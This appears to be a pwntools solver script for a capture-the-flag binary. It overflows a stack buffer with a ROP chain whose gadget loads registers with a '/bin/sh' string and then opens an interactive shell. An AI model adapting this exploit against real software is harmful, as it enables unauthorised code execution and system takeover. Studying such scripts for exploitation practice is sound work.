#!/usr/bin/python3

from pwn import *

exe = ELF('main', checksec=False)

context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
                b* 0x40103b
                b*readint+0
                ni
                ''')
        input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('')
else:
    p = process(exe.path)

GDB()
rsi_rdi_jmp_0x401106 = 0x0000000000401135
payload = b"a" * 8
payload = payload.ljust(72-8)
# payload = b""
payload += flat(
    0x413000,
    rsi_rdi_jmp_0x401106, 1, 0x68732f6e69622f
)
sla(b"input?", f"{len(payload)}".encode())
s(payload)


p.interactive()
